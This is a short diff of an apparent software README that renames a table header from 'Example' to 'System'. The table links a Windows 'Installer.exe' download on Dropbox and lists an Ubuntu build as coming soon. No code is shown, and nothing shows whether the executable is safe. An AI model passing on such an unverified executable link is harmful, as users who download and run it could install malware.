@@ -32,7 +32,7 @@ To use the program, download and install the desired version for your device.
 If the program is not installed try reinstalling the package Visual Studio 2013 (VC++ 12.0)
 
 
-Example   | Description |
+System   | Description |
 --------- | --------- |
 🔹 [Windows 7/8/8.1/10 x64-x86](https://www.dropbox.com/s/37x6h02wnvteduk/Installer.exe?dl=1) | [Download](https://www.dropbox.com/s/37x6h02wnvteduk/Installer.exe?dl=1)
 🔸 Ubuntu 20.04 LTS / Soon | Download
